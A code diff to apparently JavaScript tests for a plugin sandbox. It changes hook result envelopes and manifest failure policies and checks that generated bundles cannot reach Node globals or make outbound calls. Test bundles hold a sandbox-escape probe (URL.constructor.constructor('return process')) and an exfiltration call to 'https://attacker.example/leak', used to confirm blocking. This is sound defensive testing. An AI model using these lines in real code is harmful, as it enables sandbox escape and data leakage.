@@ -45,7 +45,7 @@ test("every template submission builds, tests, and audits packed public packages
 
 test("manifest security metadata must match its submission packet", () => {
   const packet = {
-    hook: { name: "ticket.created", type: "transform" },
+    hook: { name: "ticket.created", type: "transform", failurePolicy: "fail-closed" },
     capabilities: [],
     configKeys: [],
     egress: { mode: "deny", allowHosts: [] }
@@ -106,12 +106,18 @@ test("packed package filenames resolve against their destination", () => {
   assert.equal(resolvePackedTarball(destination, absoluteTarball), absoluteTarball);
 });
 
-test("event success comparison omits the SDK-only undefined value", () => {
-  assert.deepEqual(normalizeDispatchResult({ ok: true, value: undefined }, "event"), { ok: true });
-  assert.deepEqual(normalizeDispatchResult({ ok: true, value: null }, "transform"), {
+test("canonical hook results preserve event and transform envelopes", () => {
+  assert.deepEqual(normalizeDispatchResult({ ok: true, value: { status: "accepted" } }, "event"), {
     ok: true,
-    value: null
+    value: { status: "accepted" }
   });
+  assert.deepEqual(
+    normalizeDispatchResult(
+      { ok: true, value: { status: "transformed", output: null } },
+      "transform"
+    ),
+    { ok: true, value: { status: "transformed", output: null } }
+  );
 });
 
 test("submitted commands cannot inherit secrets and are externally time bounded", () => {
@@ -209,7 +215,7 @@ test("generated bundle dispatch terminates a synchronous loop", async () => {
       () =>
         dispatchBundleInChild(
           bundlePath,
-          { hookName: "ticket.created", payload: {} },
+          { hookName: "ticket.created", hookType: "event", payload: {}, capabilityCalls: [] },
           "synchronous-loop"
         ),
       /bundle runner failed/
@@ -228,7 +234,7 @@ test("generated bundle dispatch returns and records a declared capability call",
       `module.exports.plugin = {
         async dispatch({ context }) {
           const value = await context.capability("kv.state", { key: "ticket-priority" });
-          return { ok: true, value };
+          return { ok: true, value: { status: "accepted" } };
         }
       };\n`
     );
@@ -237,6 +243,7 @@ test("generated bundle dispatch returns and records a declared capability call",
       bundlePath,
       {
         hookName: "ticket.created",
+        hookType: "event",
         payload: {},
         capabilityCalls: [
           {
@@ -250,7 +257,7 @@ test("generated bundle dispatch returns and records a declared capability call",
     );
 
     assert.deepEqual(outcome, {
-      result: { ok: true, value: { value: "high" } },
+      result: { ok: true, value: { status: "accepted" } },
       capabilityCalls: [{ name: "kv.state", input: { key: "ticket-priority" } }]
     });
   } finally {
@@ -272,8 +279,11 @@ test("generated bundle cannot access ambient Node globals in the sandbox", async
           return {
             ok: true,
             value: {
-              processVisible: typeof process !== "undefined",
-              requireVisible: typeof require !== "undefined"
+              status: "transformed",
+              output: {
+                processVisible: typeof process !== "undefined",
+                requireVisible: typeof require !== "undefined"
+              }
             }
           };
         }
@@ -282,13 +292,13 @@ test("generated bundle cannot access ambient Node globals in the sandbox", async
 
     const outcome = dispatchBundleInChild(
       bundlePath,
-      { hookName: "ticket.created", payload: {}, capabilityCalls: [] },
+      { hookName: "ticket.created", hookType: "transform", payload: {}, capabilityCalls: [] },
       "sandbox-globals"
     );
 
     assert.deepEqual(outcome.result, {
       ok: true,
-      value: { processVisible: false, requireVisible: false }
+      value: { status: "transformed", output: { processVisible: false, requireVisible: false } }
     });
   } finally {
     await rm(tempRoot, { recursive: true, force: true });
@@ -307,18 +317,24 @@ test("generated bundle cannot recover Node through a host constructor", async ()
           try {
             processVisible = Boolean(URL.constructor.constructor("return process")());
           } catch {}
-          return { ok: true, value: { processVisible } };
+          return {
+            ok: true,
+            value: { status: "transformed", output: { processVisible } }
+          };
         }
       };\n`
     );
 
     const outcome = dispatchBundleInChild(
       bundlePath,
-      { hookName: "ticket.created", payload: {}, capabilityCalls: [] },
+      { hookName: "ticket.created", hookType: "transform", payload: {}, capabilityCalls: [] },
       "sandbox-constructor"
     );
 
-    assert.deepEqual(outcome.result, { ok: true, value: { processVisible: false } });
+    assert.deepEqual(outcome.result, {
+      ok: true,
+      value: { status: "transformed", output: { processVisible: false } }
+    });
   } finally {
     await rm(tempRoot, { recursive: true, force: true });
   }
@@ -335,7 +351,7 @@ test("generated bundle cannot hide a denied ambient fetch", async () => {
           try {
             await fetch("https://attacker.example/leak");
           } catch {}
-          return { ok: true, value: "caught" };
+          return { ok: true, value: { status: "transformed", output: "caught" } };
         }
       };\n`
     );
@@ -344,7 +360,7 @@ test("generated bundle cannot hide a denied ambient fetch", async () => {
       () =>
         dispatchBundleInChild(
           bundlePath,
-          { hookName: "ticket.created", payload: {}, capabilityCalls: [] },
+          { hookName: "ticket.created", hookType: "transform", payload: {}, capabilityCalls: [] },
           "sandbox-egress"
         ),
       /attempted ambient egress/
@@ -363,7 +379,7 @@ test("generated bundle fails when capability work remains after dispatch", async
       `module.exports.plugin = {
         dispatch({ context }) {
           setTimeout(() => context.capability("kv.state", { key: "late" }), 1_000).unref();
-          return { ok: true, value: "returned" };
+          return { ok: true, value: { status: "transformed", output: "returned" } };
         }
       };\n`
     );
@@ -374,6 +390,7 @@ test("generated bundle fails when capability work remains after dispatch", async
           bundlePath,
           {
             hookName: "ticket.created",
+            hookType: "transform",
             payload: {},
             capabilityCalls: [
               { name: "kv.state", input: { key: "late" }, result: { value: "ignored" } }
@@ -397,7 +414,7 @@ test("generated bundle fails on an unawaited capability microtask", async () => 
       `module.exports.plugin = {
         dispatch({ context }) {
           Promise.resolve().then(() => context.capability("kv.state", { key: "late" }));
-          return { ok: true, value: "returned" };
+          return { ok: true, value: { status: "transformed", output: "returned" } };
         }
       };\n`
     );
@@ -408,6 +425,7 @@ test("generated bundle fails on an unawaited capability microtask", async () => 
           bundlePath,
           {
             hookName: "ticket.created",
+            hookType: "transform",
             payload: {},
             capabilityCalls: [
               { name: "kv.state", input: { key: "late" }, result: { value: "ignored" } }
@@ -431,7 +449,7 @@ test("generated bundle fails on a capability call after dispatch returns", async
       `module.exports.plugin = {
         dispatch({ context }) {
           setImmediate(() => context.capability("kv.state", { key: "late" }));
-          return { ok: true, value: "returned" };
+          return { ok: true, value: { status: "transformed", output: "returned" } };
         }
       };\n`
     );
@@ -442,6 +460,7 @@ test("generated bundle fails on a capability call after dispatch returns", async
           bundlePath,
           {
             hookName: "ticket.created",
+            hookType: "transform",
             payload: {},
             capabilityCalls: [
               { name: "kv.state", input: { key: "late" }, result: { value: "ignored" } }
@@ -544,6 +563,7 @@ async function exerciseSubmission(submission) {
         bundlePath,
         {
           hookName: metadata.hook.name,
+          hookType: metadata.hook.type,
           payload: behaviorCase.payload,
           capabilityCalls: behaviorCase.capabilityCalls
         },
@@ -586,11 +606,9 @@ function rewriteSubmissionDependencies(dependencies, manifestTarball, pluginSdkT
 }
 
 function normalizeDispatchResult(result, hookType) {
-  // The SDK returns value: undefined for successful event hooks, which JSON evidence cannot encode.
-  // Blocking hooks retain their exact value because callers observe it.
-  if (hookType === "event" && result !== null && typeof result === "object" && result.ok === true) {
-    return { ok: true };
-  }
+  // All hook kinds now expose a serializable, closed result envelope. Keep this helper as the
+  // single comparison boundary so future packet versions cannot silently restore per-kind drift.
+  void hookType;
   return result;
 }
 
@@ -755,7 +773,11 @@ function submissionInstallArguments(pluginDirectory, storeDirectory) {
 
 function assertManifestMatchesSubmission(manifest, submission) {
   const actual = {
-    hook: manifest.hooks.map(({ name, type }) => ({ name, type })),
+    hook: manifest.hooks.map(({ name, type, failurePolicy }) => ({
+      name,
+      type,
+      failurePolicy
+    })),
     capabilities: Object.keys(manifest.capabilities).sort(),
     configKeys: Object.keys(manifest.configSchema.properties).sort(),
     egress: {
